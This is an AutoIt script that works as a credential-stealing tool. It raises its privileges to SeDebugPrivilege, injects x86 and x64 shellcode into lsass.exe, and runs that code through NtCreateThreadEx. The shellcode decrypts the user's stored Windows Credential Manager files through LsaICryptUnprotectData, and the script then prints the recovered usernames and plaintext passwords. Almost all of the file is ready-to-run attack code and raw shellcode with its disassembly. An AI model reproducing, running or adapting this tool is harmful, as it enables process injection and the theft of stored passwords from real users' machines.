;; more info here http://securityxploded.com/ntcreatethreadex.php

#include <WinAPI.au3>
#include <Memory.au3>
#include <File.au3>
#RequireAdmin



Global $LOG = False
Global $logData

Func _GetTokenInformation($hToken, $iClass)
	Local $aCall = DllCall("advapi32.dll", "bool", "GetTokenInformation", "handle", $hToken, "int", $iClass, "struct*", 0, "dword", 0, "dword*", 0)
	If @error Or Not $aCall[5] Or Not $aCall[1] Then Return SetError(@error + 10, @extended, 0)
	Local $iLen = $aCall[5]
	Local $tBuffer = DllStructCreate("byte[" & $iLen & "]")
	$aCall = DllCall("advapi32.dll", "bool", "GetTokenInformation", "handle", $hToken, "int", $iClass, "struct*", $tBuffer, "dword", DllStructGetSize($tBuffer), "dword*", 0)
	If @error Or Not $aCall[0] Then Return SetError(@error, @extended, 0)
	Return $tBuffer
EndFunc   ;==>_GetTokenInformation


Func _SelfSePrivilegeCheck()
	$seDebug = _Security__LookupPrivilegeValue(Null, $SE_DEBUG_NAME)
	If $seDebug Then
		$logData = @CRLF & "[+] SeDebugPrivilege Available" & @CRLF
		$logData &= "[+] Getting PID:" & @AutoItPID & " token" & @CRLF
		$hToken = _Security__OpenProcessToken(_WinAPI_GetCurrentProcess(), $TOKEN_ALL_ACCESS)
		If $hToken Then
			$logData &= ("[+] Trying to set SeDebugPrivilege" & @CRLF)
			_Security__SetPrivilege($hToken, $SE_DEBUG_NAME, True)
			$logData &= ("[+] Confirming SeDebugPrivilege" & @CRLF)
			$d = DllStructGetData(_GetTokenInformation($hToken, $TOKENPRIVILEGES), 1)
			$privCount = Int(BinaryMid($d, 1, 4))
			$offset = 0
			$seDebugSet = False
			For $i = 1 To $privCount
				If $offset == 0 Then $offset = 5
				$luidandattributes = BinaryMid($d, $offset, 12)
				$highpart = Int(BinaryMid($luidandattributes, 1, 4))
				$luid = BinaryMid($luidandattributes, 1, 8)
				$offset += 12
				If $highpart == $seDebug Then
					$seDebugSet = True
					ExitLoop
				EndIf
			Next
		EndIf
		If $seDebugSet Then
			$logData &= ("[+] SeDebugPrivilege Confirmed!" & @CRLF)
		Else
			$logData &= ("[-] Set SeDebugPrivilege Failed! Try running as Administrator" & @CRLF)
		EndIf
	Else
		$logData &= (@CRLF & "[+] SeDebugPrivilege Not Available" & @CRLF)
	EndIf
	_WinAPI_CloseHandle($hToken)
	Return $seDebugSet
EndFunc   ;==>_SelfSePrivilegeCheck


Func _NtCreateThreadEx($hProcess, $lpAddress, $lpParameter)
	; Works without the buffer so...
	$hThread = DllStructCreate("handle")
	$pHandle = DllCall("ntdll.dll", "int", "NtCreateThreadEx", _
			"ptr*", DllStructGetPtr($hThread), _
			"dword", 0x1FFFFF, _
			"ptr", 0, _
			"handle", $hProcess, _
			"ptr", $lpAddress, _
			"ptr", $lpParameter, _
			"bool", 1, _
			"dword", 0, _
			"dword", 0, _
			"dword", 0, _
			"ptr", 0)
	Return $pHandle[1]
EndFunc   ;==>_NtCreateThreadEx


Func _ReadMemory($hProcess, $pBaseAddress, $buflen)
	$stTemp = DllStructCreate("byte[" & $buflen & "];")
	$pDest = DllStructGetPtr($stTemp, 1)
	$iTemp = DllStructGetSize($stTemp)
	Local $read
	$m = _WinAPI_ReadProcessMemory($hProcess, $pBaseAddress, $pDest, $iTemp, $read)

	; Commence manual parse of decrypted blob :'(
	$a = DllStructGetData($stTemp, 1)
	$archAlign = DllStructGetSize(DllStructCreate("dword")) ; for proper offset jump on both x86,x64
	$b = DllStructCreate("dword dwZero;dword dwType;dword dwzero;dword dwFileTimeLowDate;dword dwFileTimeHighDate;dword dwSomeSize;dword dwPersist;char unknown[12];")

	$offset = DllStructGetSize($b) + 1 ; Start offset at DWORD dwCredNameSize
	$dwCredNameSize = Int(BinaryMid($a, $offset, $archAlign))
	If Not $dwCredNameSize Then $dwCredNameSize = $archAlign
	$offset += $archAlign + $dwCredNameSize

	$dwCommentSize = Int(BinaryMid($a, $offset, $archAlign))
	If Not $dwCommentSize Then $dwCommentSize = $archAlign
	$offset += $archAlign
	$comment = DllStructCreate("byte[" & $dwCommentSize + 2 & "]") ; +2 for proper unicode null termination
	DllStructSetData($comment, 1, BinaryMid($a, $offset, $dwCommentSize))
	ConsoleWrite("=============================================================" & @CRLF)
	ConsoleWrite("[+] Comment  -> " & _WinAPI_WideCharToMultiByte(DllStructGetPtr($comment)) & @CRLF)
	$offset += $dwCommentSize

	$dwAliasSize = Int(BinaryMid($a, $offset, $archAlign))
	If Not $dwAliasSize Then $dwAliasSize = $archAlign
	$offset += $archAlign + $dwAliasSize
	$offset += $archAlign ; dword unknown

	$dwUserNameSize = Int(BinaryMid($a, $offset, $archAlign))
	If Not $dwUserNameSize Then $dwUserNameSize = $archAlign
	$offset += $archAlign
	$username = DllStructCreate("byte[" & $dwUserNameSize + 2 & "]")
	DllStructSetData($username, 1, BinaryMid($a, $offset, $dwUserNameSize))
	ConsoleWrite("[+] Username -> " & _WinAPI_WideCharToMultiByte(DllStructGetPtr($username)) & @CRLF)
	$offset += $dwUserNameSize

	$dwPasswordSize = Int(BinaryMid($a, $offset, $archAlign))
	$offset += $archAlign
	$password = DllStructCreate("byte[" & $dwPasswordSize + 2 & "]")
	DllStructSetData($password, 1, BinaryMid($a, $offset, $dwPasswordSize))
	ConsoleWrite("[+] Password -> " & _WinAPI_WideCharToMultiByte(DllStructGetPtr($password)) & @CRLF)
	ConsoleWrite("=============================================================" & @CRLF & @CRLF)
EndFunc   ;==>_ReadMemory


Func _SetThreadPrivs($hThread)
	$hToken = _Security__OpenProcessToken(_WinAPI_GetCurrentProcess(), $TOKEN_DUPLICATE)
	$aRet = _Security__DuplicateTokenEx($hToken, $TOKEN_IMPERSONATE, $SECURITYIMPERSONATION, $TOKENIMPERSONATION)
	$pThread = DllStructCreate("ptr")
	DllStructSetData($pThread, 1, $hThread)
	$bRet = DllCall("advapi32.dll", "int", "SetThreadToken", "ptr", DllStructGetPtr($pThread), "ptr", $aRet)
	_WinAPI_CloseHandle($hToken)
	Return $bRet[0]
EndFunc   ;==>_SetThreadPrivs


Func _GetPassword()
	$pid = ProcessExists("lsass.exe")
    $logData &= ("[+] Succesfully opened process lsass.exe, pid: " & $pid & @CRLF)
	; Get lsass.exe process handle with mem read, write, operation, create thread access
	$hProcess = _WinAPI_OpenProcess(BitOR($PROCESS_VM_OPERATION, $PROCESS_VM_WRITE, $PROCESS_VM_READ, $PROCESS_CREATE_THREAD), 0, $pid)
	If Not $hProcess Then
        $logData &= ("[!] OpenProcess Error : " & _WinAPI_GetLastErrorMessage() & @CRLF)
		Exit (0)
	EndIf
    $logData &= ("[+] OpenPorcess lsass.exe Handle : " & $hProcess & @CRLF)

	$dir = @UserProfileDir & "\AppData\Local\Microsoft\Credentials\"
	$list = _FileListToArray($dir, "*", $FLTAR_FILES, True)
	For $i = 1 To UBound($list) - 1
		$file = FileOpen($list[$i], 16)
        $logData &= (@CRLF & "[+] Found File : " & StringSplit($list[$i], "\")[8] & @CRLF)
		If Not $file Then Exit (0)
		; Set file position to start of encrypted data header
		FileSetPos($file, 0xC, $FILE_BEGIN)
		$buf = FileRead($file)
		$buflen = BinaryLen($buf)
		$sBuf = DllStructCreate("byte[" & $buflen & "];")
		DllStructSetData($sBuf, 1, $buf)

		; Store encrypted data in lsass.exe by allocating memory inside it
		$lpEncryptedBuffer = _MemVirtualAllocEx($hProcess, 0, $buflen, $MEM_COMMIT, $PAGE_READWRITE)
		Local $NumberOfBytesWritten
		_WinAPI_WriteProcessMemory($hProcess, $lpEncryptedBuffer, DllStructGetPtr($sBuf), $buflen, $NumberOfBytesWritten)
        $logData &= ("[+] Encrypted buffer stored at : " & $lpEncryptedBuffer & ", " & $buflen & " bytes written" & @CRLF)

		; Allocate memory in lsass.exe for storing decrypted buffer
		$lpDecryptedBuffer = _MemVirtualAllocEx($hProcess, 0, $buflen, $MEM_COMMIT, $PAGE_READWRITE)
        $logData &= ("[+] Decrypted buffer will be written at : " & $lpDecryptedBuffer & @CRLF)

		; Create buffer to be used by shellcode and store it in lsass.exe
		$sStackParameters = DllStructCreate("ptr lpAddress;int dwSize;ptr dBuffer;int dwDoubleSize;ptr p1;ptr p2;ptr p3;ptr p4;byte lsasrv[16];byte LsaICrypt[32]")
		$hModule = _WinAPI_GetModuleHandle("kernel32.dll")
		$p1 = _WinAPI_GetProcAddress($hModule, "GetModuleHandleA")
		$p2 = _WinAPI_GetProcAddress($hModule, "GetProcAddress")
		$p3 = _WinAPI_GetProcAddress($hModule, "LocalFree")
		$p4 = _WinAPI_GetProcAddress($hModule, "GetLastError")
		DllStructSetData($sStackParameters, 1, $lpEncryptedBuffer)
		DllStructSetData($sStackParameters, 2, $buflen)
		DllStructSetData($sStackParameters, 3, $lpDecryptedBuffer)
		DllStructSetData($sStackParameters, 4, 2 * $buflen)
		DllStructSetData($sStackParameters, 5, $p1)
		DllStructSetData($sStackParameters, 6, $p2)
		DllStructSetData($sStackParameters, 7, $p3)
		DllStructSetData($sStackParameters, 8, $p4)
		DllStructSetData($sStackParameters, 9, "lsasrv.dll")
		DllStructSetData($sStackParameters, 10, "LsaICryptUnprotectData")
		$lpParameter = _MemVirtualAllocEx($hProcess, 0, DllStructGetSize($sStackParameters), $MEM_COMMIT, $PAGE_READWRITE)
		_WinAPI_WriteProcessMemory($hProcess, $lpParameter, DllStructGetPtr($sStackParameters), DllStructGetSize($sStackParameters), $NumberOfBytesWritten)
        $logData &= ("[+] lpParameter : " & $lpParameter & ", " & DllStructGetSize($sStackParameters) & " bytes written" & @CRLF)

		If @AutoItX64 Then
			$shellcode = "0x48894C24084881EC9800000048C744246000000000C74424540000000048C74424680000000048C74424700000"
			$shellcode &= "0000488B8424A00000004883C040488BC8488B8424A0000000FF5020488944246848837C246800750AB8010000"
			$shellcode &= "00E952010000488B8424A00000004883C050488BD0488B4C2468488B8424A0000000FF5028488944247048837C"
			$shellcode &= "247000750AB802000000E91C010000488D4424544889442448488D4424604889442440C744243800000000C744"
			$shellcode &= "243041000020C744242800000000C7442420000000004533C94533C0488B8424A00000008B5008488B8424A000"
			$shellcode &= "0000488B08FF5424708944245848837C2460007407837C2454007723488B8424A0000000FF50388BC0488B8C24"
			$shellcode &= "A000000048894118B803000000E9920000008B442454488B8C24A000000048394118725D488B44246048898424"
			$shellcode &= "80000000488B8424A0000000488B40104889442478C744245000000000EB0A8B442450FFC0894424508B442454"
			$shellcode &= "39442450731F8B4424508B4C2450488B5424784C8B842480000000410FB6040088040AEBCDEB07B804000000EB"
			$shellcode &= "1C48837C2460007410488B4C2460488B8424A0000000FF50308B4424544881C498000000C3CCCCCCCCCCCC"
			;         ------>Disassembly<------
			; 0x1:    894c        mov qword ptr [rsp + 8], rcx
			; 0x6:    81ec        sub rsp, 0x98
			; 0xd:    c744        mov qword ptr [rsp + 0x60], 0
			; 0x16:   c744        mov dword ptr [rsp + 0x54], 0
			; 0x1e:   c744        mov qword ptr [rsp + 0x68], 0
			; 0x27:   c744        mov qword ptr [rsp + 0x70], 0
			; 0x30:   8b84        mov rax, qword ptr [rsp + 0xa0]
			; 0x38:   83c         add rax, 0x40
			; 0x3c:   8bc8        mov rcx, rax
			; 0x3f:   8b84        mov rax, qword ptr [rsp + 0xa0]
			; 0x47:   ff5         call qword ptr [rax + 0x20]
			; 0x4a:   8944        mov qword ptr [rsp + 0x68], rax
			; 0x4f:   837c        cmp qword ptr [rsp + 0x68], 0
			; 0x55:   75          jne 0x61
			; 0x57:   b8          mov eax, 1
			; 0x5c:   e9          jmp 0x1b3
			; 0x61:   8b84        mov rax, qword ptr [rsp + 0xa0]
			; 0x69:   83c         add rax, 0x50
			; 0x6d:   8bd         mov rdx, rax
			; 0x70:   8b4c        mov rcx, qword ptr [rsp + 0x68]
			; 0x75:   8b84        mov rax, qword ptr [rsp + 0xa0]
			; 0x7d:   ff5         call qword ptr [rax + 0x28]
			; 0x80:   8944        mov qword ptr [rsp + 0x70], rax
			; 0x85:   837c        cmp qword ptr [rsp + 0x70], 0
			; 0x8b:   75          jne 0x97
			; 0x8d:   b8          mov eax, 2
			; 0x92:   e9          jmp 0x1b3
			; 0x97:   8d44        lea rax, qword ptr [rsp + 0x54]
			; 0x9c:   8944        mov qword ptr [rsp + 0x48], rax
			; 0xa1:   8d44        lea rax, qword ptr [rsp + 0x60]
			; 0xa6:   8944        mov qword ptr [rsp + 0x40], rax
			; 0xab:   c744        mov dword ptr [rsp + 0x38], 0
			; 0xb3:   c744        mov dword ptr [rsp + 0x30], 0x20000041
			; 0xbb:   c744        mov dword ptr [rsp + 0x28], 0
			; 0xc3:   c744        mov dword ptr [rsp + 0x20], 0
			; 0xcb:   33c9        xor r9d, r9d
			; 0xce:   33c         xor r8d, r8d
			; 0xd1:   8b84        mov rax, qword ptr [rsp + 0xa0]
			; 0xd9:   8b5         mov edx, dword ptr [rax + 8]
			; 0xdc:   8b84        mov rax, qword ptr [rsp + 0xa0]
			; 0xe4:   8b8         mov rcx, qword ptr [rax]
			; 0xe7:   ff54        call qword ptr [rsp + 0x70]
			; 0xeb:   8944        mov dword ptr [rsp + 0x58], eax
			; 0xef:   837c        cmp qword ptr [rsp + 0x60], 0
			; 0xf5:   74          je 0xfe
			; 0xf7:   837c        cmp dword ptr [rsp + 0x54], 0
			; 0xfc:   77          ja 0x121
			; 0xfe:   8b84        mov rax, qword ptr [rsp + 0xa0]
			; 0x106:  ff5         call qword ptr [rax + 0x38]
			; 0x109:  8bc         mov eax, eax
			; 0x10b:  8b8c        mov rcx, qword ptr [rsp + 0xa0]
			; 0x113:  8941        mov qword ptr [rcx + 0x18], rax
			; 0x117:  b8          mov eax, 3
			; 0x11c:  e9          jmp 0x1b3
			; 0x121:  8b44        mov eax, dword ptr [rsp + 0x54]
			; 0x125:  8b8c        mov rcx, qword ptr [rsp + 0xa0]
			; 0x12d:  3941        cmp qword ptr [rcx + 0x18], rax
			; 0x131:  72          jb 0x190
			; 0x133:  8b44        mov rax, qword ptr [rsp + 0x60]
			; 0x138:  8984        mov qword ptr [rsp + 0x80], rax
			; 0x140:  8b84        mov rax, qword ptr [rsp + 0xa0]
			; 0x148:  8b4         mov rax, qword ptr [rax + 0x10]
			; 0x14c:  8944        mov qword ptr [rsp + 0x78], rax
			; 0x151:  c744        mov dword ptr [rsp + 0x50], 0
			; 0x159:  eb          jmp 0x165
			; 0x15b:  8b44        mov eax, dword ptr [rsp + 0x50]
			; 0x15f:  ffc         inc eax
			; 0x161:  8944        mov dword ptr [rsp + 0x50], eax
			; 0x165:  8b44        mov eax, dword ptr [rsp + 0x54]
			; 0x169:  3944        cmp dword ptr [rsp + 0x50], eax
			; 0x16d:  73          jae 0x18e
			; 0x16f:  8b44        mov eax, dword ptr [rsp + 0x50]
			; 0x173:  8b4c        mov ecx, dword ptr [rsp + 0x50]
			; 0x177:  8b54        mov rdx, qword ptr [rsp + 0x78]
			; 0x17c:  8b84        mov r8, qword ptr [rsp + 0x80]
			; 0x184:  fb64        movzx eax, byte ptr [r8 + rax]
			; 0x189:  884         mov byte ptr [rdx + rcx], al
			; 0x18c:  eb          jmp 0x15b
			; 0x18e:  eb          jmp 0x197
			; 0x190:  b8          mov eax, 4
			; 0x195:  eb          jmp 0x1b3
			; 0x197:  837c        cmp qword ptr [rsp + 0x60], 0
			; 0x19d:  74          je 0x1af
			; 0x19f:  8b4c        mov rcx, qword ptr [rsp + 0x60]
			; 0x1a4:  8b84        mov rax, qword ptr [rsp + 0xa0]
			; 0x1ac:  ff5         call qword ptr [rax + 0x30]
			; 0x1af:  8b44        mov eax, dword ptr [rsp + 0x54]
			; 0x1b3:  81c4        add rsp, 0x98
			; 0x1ba:  c3          ret
			; 0x1bb:  cc          int3
			; 0x1bc:  cc          int3
			; 0x1bd:  cc          int3
			; 0x1be:  cc          int3
			; 0x1bf:  cc          int3
			; 0x1c0:  cc          int3
		Else
			$shellcode = "0x558BEC83EC20C745F800000000C745F400000000C745F000000000C745EC000000008B450883C020"
			$shellcode &= "508B4D088B5110FFD28945F0837DF000750AB801000000E9D50000008B450883C030508B4DF0518B"
			$shellcode &= "55088B4214FFD08945EC837DEC00750AB802000000E9AF0000008D4DF4518D55F8526A0068410000"
			$shellcode &= "206A006A006A006A008B45088B4804518B55088B0250FF55EC8945E0837DF8007406837DF4007715"
			$shellcode &= "8B4D088B511CFFD28B4D0889410CB803000000EB648B55088B420C3B45F4723D8B4DF8894DE48B55"
			$shellcode &= "088B42088945E8C745FC00000000EB098B4DFC83C101894DFC8B55FC3B55F473128B45E80345FC8B"
			$shellcode &= "4DE4034DFC8A118810EBDDEB07B804000000EB15837DF800740C8B45F8508B4D088B5118FFD28B45"
			$shellcode &= "F48BE55DC20400CC"
			;         ------>Disassembly<------
			; 0x1:    55          push ebp
			; 0x2:    8bec        mov ebp, esp
			; 0x4:    83ec        sub esp, 0x20
			; 0x7:    c745        mov dword ptr [ebp - 8], 0
			; 0xe:    c745        mov dword ptr [ebp - 0xc], 0
			; 0x15:   c745        mov dword ptr [ebp - 0x10], 0
			; 0x1c:   c745        mov dword ptr [ebp - 0x14], 0
			; 0x23:   8b45        mov eax, dword ptr [ebp + 8]
			; 0x26:   83c         add eax, 0x20
			; 0x29:   50          push eax
			; 0x2a:   8b4d        mov ecx, dword ptr [ebp + 8]
			; 0x2d:   8b51        mov edx, dword ptr [ecx + 0x10]
			; 0x30:   ffd2        call edx
			; 0x32:   8945        mov dword ptr [ebp - 0x10], eax
			; 0x35:   837d        cmp dword ptr [ebp - 0x10], 0
			; 0x39:   75          jne 0x45
			; 0x3b:   b8          mov eax, 1
			; 0x40:   e9          jmp 0x11a
			; 0x45:   8b45        mov eax, dword ptr [ebp + 8]
			; 0x48:   83c         add eax, 0x30
			; 0x4b:   50          push eax
			; 0x4c:   8b4d        mov ecx, dword ptr [ebp - 0x10]
			; 0x4f:   51          push ecx
			; 0x50:   8b55        mov edx, dword ptr [ebp + 8]
			; 0x53:   8b42        mov eax, dword ptr [edx + 0x14]
			; 0x56:   ffd         call eax
			; 0x58:   8945        mov dword ptr [ebp - 0x14], eax
			; 0x5b:   837d        cmp dword ptr [ebp - 0x14], 0
			; 0x5f:   75          jne 0x6b
			; 0x61:   b8          mov eax, 2
			; 0x66:   e9          jmp 0x11a
			; 0x6b:   8d4d        lea ecx, dword ptr [ebp - 0xc]
			; 0x6e:   51          push ecx
			; 0x6f:   8d55        lea edx, dword ptr [ebp - 8]
			; 0x72:   52          push edx
			; 0x73:   6a          push 0
			; 0x75:   68          push 0x20000041
			; 0x7a:   6a          push 0
			; 0x7c:   6a          push 0
			; 0x7e:   6a          push 0
			; 0x80:   6a          push 0
			; 0x82:   8b45        mov eax, dword ptr [ebp + 8]
			; 0x85:   8b48        mov ecx, dword ptr [eax + 4]
			; 0x88:   51          push ecx
			; 0x89:   8b55        mov edx, dword ptr [ebp + 8]
			; 0x8c:   8b2         mov eax, dword ptr [edx]
			; 0x8e:   50          push eax
			; 0x8f:   ff55        call dword ptr [ebp - 0x14]
			; 0x92:   8945        mov dword ptr [ebp - 0x20], eax
			; 0x95:   837d        cmp dword ptr [ebp - 8], 0
			; 0x99:   74          je 0xa1
			; 0x9b:   837d        cmp dword ptr [ebp - 0xc], 0
			; 0x9f:   77          ja 0xb6
			; 0xa1:   8b4d        mov ecx, dword ptr [ebp + 8]
			; 0xa4:   8b51        mov edx, dword ptr [ecx + 0x1c]
			; 0xa7:   ffd2        call edx
			; 0xa9:   8b4d        mov ecx, dword ptr [ebp + 8]
			; 0xac:   8941        mov dword ptr [ecx + 0xc], eax
			; 0xaf:   b8          mov eax, 3
			; 0xb4:   eb          jmp 0x11a
			; 0xb6:   8b55        mov edx, dword ptr [ebp + 8]
			; 0xb9:   8b42        mov eax, dword ptr [edx + 0xc]
			; 0xbc:   3b45        cmp eax, dword ptr [ebp - 0xc]
			; 0xbf:   72          jb 0xfe
			; 0xc1:   8b4d        mov ecx, dword ptr [ebp - 8]
			; 0xc4:   894d        mov dword ptr [ebp - 0x1c], ecx
			; 0xc7:   8b55        mov edx, dword ptr [ebp + 8]
			; 0xca:   8b42        mov eax, dword ptr [edx + 8]
			; 0xcd:   8945        mov dword ptr [ebp - 0x18], eax
			; 0xd0:   c745        mov dword ptr [ebp - 4], 0
			; 0xd7:   eb          jmp 0xe2
			; 0xd9:   8b4d        mov ecx, dword ptr [ebp - 4]
			; 0xdc:   83c1        add ecx, 1
			; 0xdf:   894d        mov dword ptr [ebp - 4], ecx
			; 0xe2:   8b55        mov edx, dword ptr [ebp - 4]
			; 0xe5:   3b55        cmp edx, dword ptr [ebp - 0xc]
			; 0xe8:   73          jae 0xfc
			; 0xea:   8b45        mov eax, dword ptr [ebp - 0x18]
			; 0xed:   345         add eax, dword ptr [ebp - 4]
			; 0xf0:   8b4d        mov ecx, dword ptr [ebp - 0x1c]
			; 0xf3:   34d         add ecx, dword ptr [ebp - 4]
			; 0xf6:   8a11        mov dl, byte ptr [ecx]
			; 0xf8:   881         mov byte ptr [eax], dl
			; 0xfa:   eb          jmp 0xd9
			; 0xfc:   eb          jmp 0x105
			; 0xfe:   b8          mov eax, 4
			; 0x103:  eb          jmp 0x11a
			; 0x105:  837d        cmp dword ptr [ebp - 8], 0
			; 0x109:  74          je 0x117
			; 0x10b:  8b45        mov eax, dword ptr [ebp - 8]
			; 0x10e:  50          push eax
			; 0x10f:  8b4d        mov ecx, dword ptr [ebp + 8]
			; 0x112:  8b51        mov edx, dword ptr [ecx + 0x18]
			; 0x115:  ffd2        call edx
			; 0x117:  8b45        mov eax, dword ptr [ebp - 0xc]
			; 0x11a:  8be5        mov esp, ebp
			; 0x11c:  5d          pop ebp
			; 0x11d:  c2          ret 4
			; 0x120:  cc          int3
		EndIf

		$asm = DllStructCreate("byte[" & BinaryLen($shellcode) & "]")
		DllStructSetData($asm, 1, $shellcode)
		$lpAddress = _MemVirtualAllocEx($hProcess, 0, DllStructGetSize($asm), $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)
		_WinAPI_WriteProcessMemory($hProcess, $lpAddress, DllStructGetPtr($asm), DllStructGetSize($asm), $NumberOfBytesWritten)
        $logData &= ("[+] lpAddress : " & $lpAddress & ", " & DllStructGetSize($asm) & " bytes written" & @CRLF)

		$hThread = _NtCreateThreadEx($hProcess, $lpAddress, $lpParameter) ; Start a new thread in lsass.exe which starts at $lpAddress
        $logData &= ("[+] Started suspended thread with handle : " & $hThread & @CRLF)
		_SetThreadPrivs($hThread) ; Adjust token privileges
		$aRet = DllCall("kernel32.dll", "int", "ResumeThread", "int", $hThread)
        $logData &= ("[+] Thread resume status : " & $aRet[0] & @CRLF)
		_WinAPI_WaitForSingleObject($hThread, 0xFFFFFFFF)
        $logData &= ("[+] Waiting for thread to finish" & @CRLF)
		If $LOG Then ConsoleWrite($logData)
		_ReadMemory($hProcess, $lpDecryptedBuffer, $buflen)
		_MemVirtualFreeEx($hProcess, $lpEncryptedBuffer, 0, $MEM_RELEASE)
		_MemVirtualFreeEx($hProcess, $lpDecryptedBuffer, 0, $MEM_RELEASE)
		_MemVirtualFreeEx($hProcess, $lpParameter, 0, $MEM_RELEASE)
		_MemVirtualFreeEx($hProcess, $lpAddress, 0, $MEM_RELEASE)
		_WinAPI_CloseHandle($hThread)
	Next
	_WinAPI_CloseHandle($hProcess)
EndFunc   ;==>_GetPassword


_SelfSePrivilegeCheck()
_GetPassword()
